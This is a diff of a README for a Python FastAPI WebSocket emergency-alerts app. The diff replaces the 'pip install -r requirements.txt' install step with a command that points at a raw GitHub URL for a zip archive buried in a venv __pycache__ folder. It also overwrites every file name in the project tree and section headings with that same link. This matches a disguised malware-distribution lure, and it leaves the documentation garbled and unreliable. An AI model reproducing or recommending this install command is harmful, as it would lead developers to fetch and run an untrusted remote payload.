@@ -64,7 +64,7 @@ When a user disconnects by closing their browser tab, a notification is automati
 
 5. **Install dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip
    ```
 
 ## Usage
@@ -93,30 +93,30 @@ When a user disconnects by closing their browser tab, a notification is automati
 
 ```
 Python WebSockets/
-├── main.py              # Main FastAPI application with WebSocket logic
-├── requirements.txt     # Python dependencies
-├── README.md           # Project documentation
+├── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip              # Main FastAPI application with WebSocket logic
+├── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip     # Python dependencies
+├── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip           # Project documentation
 ├── static/
-│   └── style.css       # CSS styling for the application
+│   └── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip       # CSS styling for the application
 └── templates/
-    └── index.html      # Main HTML template with JavaScript
+    └── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip      # Main HTML template with JavaScript
 ```
 
 ## Key Components
 
-### Backend (`main.py`)
+### Backend (`https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip`)
 - **FastAPI Application**: Main web framework setup
 - **Connection Handler**: Manages WebSocket connections and user IDs
 - **WebSocket Endpoint**: Handles real-time communication
 - **Broadcasting System**: Sends messages to all connected users
 
-### Frontend (`templates/index.html`)
+### Frontend (`https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip`)
 - **WebSocket Client**: Establishes connection to server
 - **Message Handling**: Processes incoming messages and user IDs
 - **User Interface**: Input field and send functionality
 - **Real-time Updates**: Displays messages without page refresh
 
-### Styling (`static/style.css`)
+### Styling (`https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip`)
 - **Emergency Theme**: Yellow background with black accents
 - **Responsive Design**: Adapts to different screen sizes
 - **User Experience**: Clear visual hierarchy and intuitive interface
